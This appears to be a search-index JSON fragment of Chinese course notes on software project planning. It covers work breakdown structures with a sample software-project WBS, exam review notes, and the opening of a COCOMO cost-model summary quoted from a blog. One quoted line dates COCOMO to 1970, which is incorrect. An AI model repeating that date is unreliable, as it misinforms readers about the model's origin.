\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#2","text":"WBS\uff1a\u5de5\u4f5c\u5206\u89e3\u7ed3\u6784\uff08Work Breakdown Structure\uff09\uff0c \u521b\u5efaWBS\u662f\u628a\u9879\u76ee\u5de5\u4f5c\u6309\u9636\u6bb5\u53ef\u4ea4\u4ed8\u6210\u679c\u5206\u89e3\u6210\u8f83\u5c0f\u7684\uff0c\u66f4\u6613\u4e8e\u7ba1\u7406\u7684\u7ec4\u6210\u90e8\u5206\u7684\u8fc7\u7a0b\u3002 WBS\u662f\u9879\u76ee\u7ba1\u7406\u91cd\u8981\u7684\u4e13\u4e1a\u672f\u8bed\u4e4b\u4e00\u3002WBS\u7684\u57fa\u672c\u5b9a\u4e49 \uff1a\u4ee5\u53ef\u4ea4\u4ed8\u6210\u679c\u4e3a\u5bfc\u5411\u5bf9\u9879\u76ee\u8981\u7d20\u8fdb\u884c\u7684\u5206\u7ec4\uff0c\u5b83\u5f52\u7eb3\u548c\u5b9a\u4e49\u4e86\u9879\u76ee\u7684\u6574\u4e2a\u5de5\u4f5c\u8303\u56f4\u6bcf\u4e0b\u964d\u4e00\u5c42\u4ee3\u8868\u5bf9\u9879\u76ee\u5de5\u4f5c\u7684\u66f4\u8be6\u7ec6\u5b9a\u4e49\u3002\u65e0\u8bba\u5728\u9879\u76ee\u7ba1\u7406\u5b9e\u8df5\u4e2d\uff0c\u8fd8\u662f\u5728PMP\uff0cIPMP\u8003\u8bd5\u4e2d\uff0c\u5de5\u4f5c\u5206\u89e3\u7ed3\u6784\uff08WBS\uff09\u90fd\u662f\u6700\u91cd\u8981\u7684\u5185\u5bb9\u4e4b\u4e00\u3002WBS\u603b\u662f\u5904\u4e8e\u8ba1\u5212\u8fc7\u7a0b\u7684\u4e2d\u5fc3\uff0c\u4e5f\u662f\u5236\u5b9a\u8fdb\u5ea6\u8ba1\u5212\u3001\u8d44\u6e90\u9700\u6c42\u3001\u6210\u672c\u9884\u7b97\u3001\u98ce\u9669\u7ba1\u7406\u8ba1\u5212\u548c\u91c7\u8d2d\u8ba1\u5212\u7b49\u7684\u91cd\u8981\u57fa\u7840\u3002WBS\u540c\u65f6\u4e5f\u662f\u63a7\u5236\u9879\u76ee\u53d8\u66f4\u7684\u91cd\u8981\u57fa\u7840\u3002\u9879\u76ee\u8303\u56f4\u662f\u7531WBS\u5b9a\u4e49\u7684\uff0c\u6240\u4ee5WBS\u4e5f\u662f\u4e00\u4e2a\u9879\u76ee\u7684\u7efc\u5408\u5de5\u5177\u3002","title":"2. \u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#3","text":"","title":"3. \u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#31-practice-standard-for-work-breakdown-structures","text":"\u5982\u4f55\u521b\u5efaWBS\uff0c Project management Insitute \u51fa\u7248\u7684 \u300aPractice Standard for Work Breakdown Structures\u300b \u4e2d\u5bf9WBS\u505a\u4e86\u8be6\u7ec6\u7684\u63cf\u8ff0\u3002 \u7f51\u76d8\u94fe\u63a5\uff1a https://pan.baidu.com/s/1PgecXzFi-6fMjaS0aBzeHw \u5bc6\u7801: fehk The Work Breakdown Structure (WBS) can be created new, or it can reuse com- ponents from other WBSs. When reusing existing components, WBS elements may be drawn from previous similar projects or from standard project templates that the organization has determined support accepted best practices. The following sections in this chapter are presented as guides for use during the development of a WBS, and contain a number of topics for consideration: 4.2 contains Guidelines for Preparation 4.3 contains Basic Assumptions or Factors 4.4 contains Measurement Considerations 4.5 includes Project Challenges for Consideration 4.6 aids in determining the Appropriate Level of Detail 4.7 discusses WBS Life-Cycle Considerations 4.8 addresses Risk Assessment 4.9 contains guidance for use when considering Resource Planning. Some of the sections can be used as checklists for the development and refine- ment of the WBS.","title":"3.1. Practice Standard for Work Breakdown Structures"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#32-preparing-a-wbs","text":"The WBS evolves through an iterative consideration of the project\u2019s purpose and objectives, functional/performance design criteria, project scope, technical performance requirements, and other technical attributes. A high-level WBS can often be developed early in the conceptual stage of the project. Once the project is defined and specifications are prepared, a more detailed WBS can be developed. The WBS can assist the project manager and stakeholders in developing a clear vision of the end product(s) of the project and of the overall process by which it will be created. With this in mind, the following should stimulate thought when developing a WBS to manage the project: Think through the entire project. (Look at dividing high-level deliverables.) Think deliverables. (What is to be provided/what is required?) Think with the end in mind. (How will this component contribute to the finished deliverable?) Think through the production of the deliverables. (What methods? What special processes? What quality requirements? What inspections?) Have you formulated a vision of the final product in your mind? What are its constituent parts? How do the pieces work together? What needs to be done? These thoughts and questions are intended to help the project manager develop a clear statement of what the product of the project is\u2014and to help answer the question, \u201cHow does one eat an elephant?\u201d Answer: \u201cOne bite at a time!\u201d The WBS is the technique for dividing \u201cthe elephant\u201d into bite-sized pieces. The following steps describe the general process for developing a WBS: Step 1 : Identify the final product(s) of the project\u2014what must be delivered to achieve project success. A thorough review of high-level project scope documents (inputs such as statement of work [SOW], technical requirements documents, and so on) is recommended to ensure consistency between the WBS and the project requirements. Step 2 : Define the product\u2019s major deliverables, which are often predecessor deliverables necessary for the project, but that in themselves do not satisfy a business need (e.g., a design specification). Step 3 : Decompose major deliverables to a level of detail appropriate for management and integrated control. These WBS elements normally tie to clear and discrete identification of stand-alone deliverable products. Step 4 : Review and refine the WBS until project stakeholders agree that project planning can be successfully completed and that execution and control will successfully produce the desired outcomes.","title":"3.2. PREPARING A WBS"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#4","text":"SOFTWARE IMPLEMENTATION PROJECT WBS 1.0 Project Management 1.1 Planning 1.1.1 Develop Project Charter 1.1.2 Define Scope 1.1.3 Develop Resource Plan 1.1.4 Develop Communication Plan 1.1.5 Develop Risk Plan 1.1.6 Develop Change Control Plan 1.1.7 Develop Quality Plan 1.1.8 Develop Purchase Plan 1.1.9 Develop Cost Plan 1.1.10 Develop Organization Plan 1.1.11 Develop Project Schedule 1.2 Meetings 1.2.1 Conduct Kickoff Meeting 1.2.2 Weekly Status Meeting 1.2.3 Monthly Tactical Meeting 1.2.4 Project Closing Meeting 1.3 Administration 1.3.1 Standards 1.3.1.1 Document Performance Standards 1.3.1.2 Document Reporting Standards 1.3.1.3 Document Naming Conventions 1.3.1.4 Document Housekeeping Standards 1.3.2 Program Office 1.3.2.1 Develop Program Office Charter 1.3.2.2 Assign Program Office Resources 2.0 Product Requirements 2.1 Software Requirements 2.1.1 Create Draft Software Requirements 2.1.2 Review Draft Software Requirements 2.1.3 Update Draft Software Requirements 2.1.4 Review Final Software Requirements 2.1.5 Software Requirements Approved 2.2 User Documentation 2.2.1 Create Draft User Documentation 2.2.2 Review Draft User Documentation 2.2.3 Update Draft User Documentation 2.2.4 Review Final User Documentation 2.2.5 User Documentation Approved 2.3 Training Program Materials 2.3.1 Create Initial Training Requirements 2.3.2 Review & Approve Training Requirements 2.3.3 Create Initial Training Materials 2.3.4 Review & Approve Training Materials 2.3.5 Conduct Trial Course Delivery 2.3.6 Update and Finalize Training Materials 2.4 Hardware 2.4.1 Create Draft Hardware Requirements 2.4.2 Review Draft Hardware Requirements 2.4.3 Hardware Requirements Approved 2.5 Implementation & Future Support 3.0 Detail Software Design 3.1 Create Initial Software Design 3.2 Review Initial Software Design 3.3 Update Initial Software Design 3.4 Review Final Software Design 3.5 Software Design Approved 4.0 System Construction 4.1 Configure Software 4.2 Customize User Documentation 4.3 Customize Training Program Materials 4.4 Install Hardware 4.5 Implementation & Future Support","title":"4. \u793a\u4f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#5","text":"# \u7ba1\u7406\u4fe1\u606f\u7cfb\u7edf ## \u521d\u59cb\u9636\u6bb5 ### \u9879\u76ee\u8ba1\u5212 #### \u5236\u5b9a\u9879\u76ee\u7ae0\u7a0b #### \u5236\u5b9a\u9879\u76ee\u8ba1\u5212 #### \u5236\u5b9a\u8d28\u91cf\u8ba1\u5212 ### \u9700\u6c42\u5206\u6790 #### \u9700\u6c42\u5efa\u6a21 #### \u9700\u6c42\u590d\u6838 #### \u7f16\u5199\u9700\u6c42\u89c4\u683c\u8bf4\u660e\u4e66 #### \u9700\u6c42\u68c0\u67e5 ## \u7ec6\u5316\u9636\u6bb5 ### \u6982\u8981\u8bbe\u8ba1 #### \u529f\u80fd\u6a21\u5757\u8bbe\u8ba1 #### \u6570\u636e\u5b58\u50a8\u8bbe\u8ba1 #### \u7528\u6237\u754c\u9762\u8bbe\u8ba1 #### \u7f16\u5199\u6982\u8981\u8bbe\u8ba1\u8bf4\u660e\u4e66 #### \u6982\u8981\u8bbe\u8ba1\u590d\u6838 ### \u8be6\u7ec6\u8bbe\u8ba1 #### \u5904\u7406\u903b\u8f91\u8bbe\u8ba1 #### \u63a5\u53e3\u8bbe\u8ba1 #### \u9875\u9762\u4e0e\u540e\u53f0\u8bbe\u8ba1 #### \u7f16\u5199\u8be6\u7ec6\u8bbe\u8ba1\u8bf4\u660e\u4e66 #### \u8be6\u7ec6\u8bbe\u8ba1\u590d\u6838 ### \u5236\u5b9a\u6d4b\u8bd5\u8ba1\u5212 #### \u8bbe\u8ba1\u6d4b\u8bd5\u7528\u4f8b #### \u7f16\u5199\u6d4b\u8bd5\u8ba1\u5212\u8bf4\u660e\u4e66 ## \u6784\u9020\u9636\u6bb5 ### \u7f16\u7801\u5b9e\u73b0 #### \u524d\u7aef\u7f16\u7801\u5b9e\u73b0 #### \u540e\u7aef\u7f16\u7801\u5b9e\u73b0 ### \u8f6f\u4ef6\u6d4b\u8bd5 #### \u5355\u5143\u6d4b\u8bd5 #### \u96c6\u6210\u6d4b\u8bd5 #### \u7cfb\u7edf\u6d4b\u8bd5 ## \u4ea4\u4ed8\u9636\u6bb5 ### \u4e0a\u7ebf\u4ea4\u4ed8 #### \u6700\u7ec8\u68c0\u67e5 #### \u4e0a\u7ebf\u90e8\u7f72 #### \u9879\u76ee\u9a8c\u6536 #### \u9879\u76ee\u8bd5\u8fd0\u884c #### \u9879\u76ee\u603b\u7ed3 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u5b9e\u64cd"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/","text":"\u590d\u4e60\u7b14\u8bb0 # \u76ee\u5f55 # \u590d\u4e60\u7b14\u8bb0 \u76ee\u5f55 1. \u80cc\u666f 2. \u601d\u7ef4\u5bfc\u56fe 3. \u5185\u5bb9\u603b\u7ed3 3.1. \u8f6f\u4ef6\u5ea6\u91cf 3.2. \u9879\u76ee\u8ba1\u5212 3.3. \u9700\u6c42\u5206\u6790 3.4. UML\u56fe 4. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u5728\u590d\u4e60\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u628a\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u4e2d\u5b66\u4e60\u5230\u7684\u5185\u5bb9\u8fdb\u884c\u68b3\u7406\uff0c\u4f9b\u5927\u5bb6\u53c2\u8003\u3002 2. \u601d\u7ef4\u5bfc\u56fe # # \u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1 ## \u9879\u76ee\u7ba1\u7406 ### \u9879\u76ee\u8ba1\u5212 #### \u91cc\u7a0b\u7891\u89c4\u5212 #### WBS\u5de5\u4f5c\u5206\u89e3 #### \u8f6f\u4ef6\u5f00\u53d1\u65b9\u6cd5 #### \u7518\u7279\u56fe ### \u8f6f\u4ef6\u5ea6\u91cf #### \u529f\u80fd\u70b9\u4f30\u8ba1(NESMA) #### \u4ee3\u7801\u884c\u4f30\u8ba1 #### \u5de5\u65f6\u4f30\u8ba1(COCOMO) ## \u8f6f\u4ef6\u5de5\u7a0b ### \u9700\u6c42\u5206\u6790 #### \u8f6f\u4ef6\u9700\u6c42\u89c4\u8303SRS #### \u95ee\u9898\u57df\u5206\u6790 ##### CRC\u5efa\u6a21 ### \u8f6f\u4ef6\u8bbe\u8ba1 #### \u7cfb\u7edf\u7ed3\u6784\u8bbe\u8ba1 #### \u63a5\u53e3\u8bbe\u8ba1 #### \u7528\u6237\u754c\u9762\u8bbe\u8ba1 ### UML\u56fe #### \u7528\u4f8b\u56fe #### \u7c7b\u56fe #### \u6d3b\u52a8\u56fe #### \u987a\u5e8f\u56fe ### \u6570\u636e\u5e93\u8bbe\u8ba1 #### ER\u56fe #### \u6570\u636e\u5b57\u5178 ### \u8d28\u91cf\u7ba1\u7406 #### \u8d28\u91cf\u63a7\u5236\u8ba1\u5212 #### \u8f6f\u4ef6\u6d4b\u8bd5 ##### \u6d4b\u8bd5\u7b56\u7565 ##### \u6d4b\u8bd5\u8ba1\u5212 ##### \u6d4b\u8bd5\u7528\u4f8b 3. \u5185\u5bb9\u603b\u7ed3 # 3.1. \u8f6f\u4ef6\u5ea6\u91cf # NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5 COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b 3.2. \u9879\u76ee\u8ba1\u5212 # \u5de5\u4f5c\u5206\u89e3\u7ed3\u6784WBS 3.3. \u9700\u6c42\u5206\u6790 # 3.4. UML\u56fe # 4. \u53c2\u8003\u6587\u732e # \u9879\u76ee\u7ba1\u7406\u534f\u4f1a\u300aPMBOK\u9879\u76ee\u7ba1\u7406\u77e5\u8bc6\u4f53\u7cfb\u6307\u5357\u7b2c\u516d\u7248\u300b \u7f57\u6770 S.\u666e\u8d56\u65af\u66fc\u7b49\u300a\u8f6f\u4ef6\u5de5\u7a0b-\u5b9e\u8df5\u8005\u7684\u7814\u7a76\u65b9\u6cd5\u300b Project management Insitute. \u300aPractice Standard for Work Breakdown Structures\u300b","title":"5.\u590d\u4e60\u7b14\u8bb0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#_1","text":"","title":"\u590d\u4e60\u7b14\u8bb0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#_2","text":"\u590d\u4e60\u7b14\u8bb0 \u76ee\u5f55 1. \u80cc\u666f 2. \u601d\u7ef4\u5bfc\u56fe 3. \u5185\u5bb9\u603b\u7ed3 3.1. \u8f6f\u4ef6\u5ea6\u91cf 3.2. \u9879\u76ee\u8ba1\u5212 3.3. \u9700\u6c42\u5206\u6790 3.4. UML\u56fe 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#1","text":"\u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u5728\u590d\u4e60\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u628a\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u4e2d\u5b66\u4e60\u5230\u7684\u5185\u5bb9\u8fdb\u884c\u68b3\u7406\uff0c\u4f9b\u5927\u5bb6\u53c2\u8003\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#2","text":"# \u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1 ## \u9879\u76ee\u7ba1\u7406 ### \u9879\u76ee\u8ba1\u5212 #### \u91cc\u7a0b\u7891\u89c4\u5212 #### WBS\u5de5\u4f5c\u5206\u89e3 #### \u8f6f\u4ef6\u5f00\u53d1\u65b9\u6cd5 #### \u7518\u7279\u56fe ### \u8f6f\u4ef6\u5ea6\u91cf #### \u529f\u80fd\u70b9\u4f30\u8ba1(NESMA) #### \u4ee3\u7801\u884c\u4f30\u8ba1 #### \u5de5\u65f6\u4f30\u8ba1(COCOMO) ## \u8f6f\u4ef6\u5de5\u7a0b ### \u9700\u6c42\u5206\u6790 #### \u8f6f\u4ef6\u9700\u6c42\u89c4\u8303SRS #### \u95ee\u9898\u57df\u5206\u6790 ##### CRC\u5efa\u6a21 ### \u8f6f\u4ef6\u8bbe\u8ba1 #### \u7cfb\u7edf\u7ed3\u6784\u8bbe\u8ba1 #### \u63a5\u53e3\u8bbe\u8ba1 #### \u7528\u6237\u754c\u9762\u8bbe\u8ba1 ### UML\u56fe #### \u7528\u4f8b\u56fe #### \u7c7b\u56fe #### \u6d3b\u52a8\u56fe #### \u987a\u5e8f\u56fe ### \u6570\u636e\u5e93\u8bbe\u8ba1 #### ER\u56fe #### \u6570\u636e\u5b57\u5178 ### \u8d28\u91cf\u7ba1\u7406 #### \u8d28\u91cf\u63a7\u5236\u8ba1\u5212 #### \u8f6f\u4ef6\u6d4b\u8bd5 ##### \u6d4b\u8bd5\u7b56\u7565 ##### \u6d4b\u8bd5\u8ba1\u5212 ##### \u6d4b\u8bd5\u7528\u4f8b","title":"2. \u601d\u7ef4\u5bfc\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#3","text":"","title":"3. \u5185\u5bb9\u603b\u7ed3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#31","text":"NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5 COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b","title":"3.1. \u8f6f\u4ef6\u5ea6\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#32","text":"\u5de5\u4f5c\u5206\u89e3\u7ed3\u6784WBS","title":"3.2. \u9879\u76ee\u8ba1\u5212"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#33","text":"","title":"3.3. \u9700\u6c42\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#34-uml","text":"","title":"3.4. UML\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/5.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#4","text":"\u9879\u76ee\u7ba1\u7406\u534f\u4f1a\u300aPMBOK\u9879\u76ee\u7ba1\u7406\u77e5\u8bc6\u4f53\u7cfb\u6307\u5357\u7b2c\u516d\u7248\u300b \u7f57\u6770 S.\u666e\u8d56\u65af\u66fc\u7b49\u300a\u8f6f\u4ef6\u5de5\u7a0b-\u5b9e\u8df5\u8005\u7684\u7814\u7a76\u65b9\u6cd5\u300b Project management Insitute. \u300aPractice Standard for Work Breakdown Structures\u300b","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/","text":"COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b # \u76ee\u5f55 # COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u5b9a\u4e49 4. \u6a21\u578b 4.1. Basic Model 4.2. Intermediate Model 4.3. Detailed Model 1. \u80cc\u666f # \u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002 2. \u6982\u8ff0 # \u6784\u9020\u6027\u6210\u672c\u6a21\u578b\uff08COCOMO\uff0cConstructive Cost Model\uff09\u662f\u7531\u5df4\u91cc\u00b7\u52c3\u59c6\uff08Barry Boehm\uff09\u63d0\u51fa\u7684\u4e00\u79cd\u8f6f\u4ef6\u6210\u672c\u4f30\u7b97\u65b9\u6cd5\u3002\u8fd9\u79cd\u6a21\u578b\u4f7f\u7528\u4e00\u79cd\u57fa\u672c\u7684\u56de\u5f52\u5206\u6790\u516c\u5f0f\uff0c\u4f7f\u7528\u4ece\u9879\u76ee\u5386\u53f2\u548c\u73b0\u72b6\u4e2d\u7684\u67d0\u4e9b\u7279\u5f81\u4f5c\u4e3a\u53c2\u6570\u6765\u8fdb\u884c\u8ba1\u7b97\u3002\u4ece\u672c\u8d28\u4e0a\u8bf4\u662f\u4e00\u79cd\u53c2\u6570\u5316\u7684\u9879\u76ee\u4f30\u7b97\u65b9\u6cd5\uff0c\u53c2\u6570\u5efa\u6a21\u662f\u628a\u9879\u76ee\u7684\u67d0\u4e9b\u7279\u5f81\u4f5c\u4e3a\u53c2\u6570\uff0c\u901a\u8fc7\u5efa\u7acb\u4e00\u4e2a\u6570\u5b57\u6a21\u578b\u9884\u6d4b\u9879\u76ee\u6210\u672c\u3002 3. \u5b9a\u4e49 # \u4ece GeeksforGeeks\u7684\u4e00\u7bc7\u535a\u5ba2 \u4e2d\u6458\u53d6COCOMO\u6a21\u578b\u7684\u5185\u5bb9\u3002 Cocomo (Constructive Cost Model) is a regression model based on LOC, i.e number of Lines of Code. It is a procedural cost estimate model for software projects and often used as a process of reliably predicting the various parameters associated with making a project such as size, effort, cost, time and quality. It was proposed by Barry Boehm in 1970 and is based on the study of 63 projects, which make it one of the best-documented models. The key parameters which define the quality of any software products, which are also an outcome of the Cocomo are primarily Effort & Schedule: Effort: Amount of labor that will be required to complete a task. It is measured in person-months units. Schedule: Simply means the amount of time required for the completion of the job, which is, of course, proportional to the effort put. It is measured in the units of time such as weeks, months. Different models of Cocomo have been proposed to predict the cost estimation at different levels, based on the amount of accuracy and correctness required. All of these models can be applied to a variety of projects, whose characteristics determine the value of constant to be used in subsequent calculations. These characteristics pertaining to different system types are mentioned below. Boehm\u2019s definition of organic, semidetached, and embedded systems: Organic \u2013 A software project is said to be an organic type if the team size required is adequately small, the problem is well understood and has been solved in the past and also the team members have a nominal experience regarding the problem. Semi-detached \u2013 A software project is said to be a Semi-detached type if the vital characteristics such as team-size, experience, knowledge of the various programming environment lie in between that of organic and Embedded. The projects classified as Semi-Detached are comparatively less familiar and difficult to develop compared to the organic ones and require more experience and better guidance and creativity. Eg: Compilers or different Embedded Systems can be considered of Semi-Detached type. Embedded \u2013 A software project with requiring the highest level of complexity, creativity, and experience requirement fall under this category. Such software requires a larger team size than the other two models and also the developers need to be sufficiently experienced and creative to develop such complex models. MBA\u667a\u5e93\u767e\u79d1 \u4e2d\u4e5f\u5bf9\u4e09\u79cd\u7c7b\u578b\u505a\u4e86\u5b9a\u4e49\u3002 COCOMO\u6a21\u578b\u4e2d\uff0c\u8003\u8651\u5230\u5f00\u53d1\u73af\u5883\u7684\u4e0d\u540c\uff0c\u8f6f\u4ef6\u5f00\u53d1\u9879\u76ee\u7684\u7c7b\u578b\u53ef\u4ee5\u5206\u4e3a3\u79cd\uff1a \u7ec4\u7ec7\u578b\uff08organic\uff09\uff1a\u76f8\u5bf9\u8f83\u5c0f\u3001\u8f83\u7b80\u5355\u7684\u8f6f\u4ef6\u9879\u76ee\u3002\u5f00\u53d1\u4eba\u5458\u5bf9\u5f00\u53d1\u76ee\u6807\u7406\u89e3\u6bd4\u8f83\u5145\u5206\uff0c\u4e0e\u8f6f\u4ef6\u7cfb\u7edf\u76f8\u5173\u7684\u5de5\u4f5c\u7ecf\u9a8c\u4e30\u5bcc\uff0c\u5bf9\u8f6f\u4ef6\u7684\u4f7f\u7528\u73af\u5883\u5f88\u719f\u6089\uff0c\u53d7\u786c\u4ef6\u7684\u7ea6\u675f\u8f83\u5c0f\uff0c\u7a0b\u5e8f\u7684\u89c4\u6a21\u4e0d\u662f\u5f88\u5927\uff08<50000\u884c\uff09\u3002 \u5d4c\u5165\u578b\uff08embedded\uff09\uff1a\u8981\u6c42\u5728\u7d27\u5bc6\u8054\u7cfb\u7684\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u64cd\u4f5c\u7684\u9650\u5236\u6761\u4ef6\u4e0b\u8fd0\u884c\uff0c\u901a\u5e38\u4e0e\u67d0\u79cd\u590d\u6742\u7684\u786c\u4ef6\u8bbe\u5907\u7d27\u5bc6\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u5bf9\u63a5\u53e3\u3001\u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\u7684\u8981\u6c42\u5f88\u9ad8\uff0c\u8f6f\u4ef6\u89c4\u6a21\u4efb\u610f\u3002\u5982\u5927\u800c\u590d\u6742\u7684\u4e8b\u52a1\u5904\u7406\u7cfb\u7edf\uff0c\u5927\u578b/\u8d85\u5927\u578b\u64cd\u4f5c\u7cfb\u7edf\uff0c\u822a\u5929\u7528\u63a7\u5236\u7cfb\u7edf\uff0c\u5927\u578b\u6307\u6325\u7cfb\u7edf\u7b49\u3002 \u534a\u72ec\u7acb\u578b\uff08semidetached\uff09\uff1a\u4ecb\u4e8e\u4e0a\u8ff0\u4e24\u79cd\u8f6f\u4ef6\u4e4b\u95f4\u3002\u89c4\u6a21\u548c\u590d\u6742\u5ea6\u90fd\u5c5e\u4e8e\u4e2d\u7b49\u6216\u66f4\u9ad8\u3002\u6700\u5927\u53ef\u8fbe30\u4e07\u884c\u3002 All the above system types utilize different values of the constants used in Effort Calculations. Types of Models : COCOMO consists of a hierarchy of three increasingly detailed and accurate forms. Any of the three forms can be adopted according to our requirements. These are types of 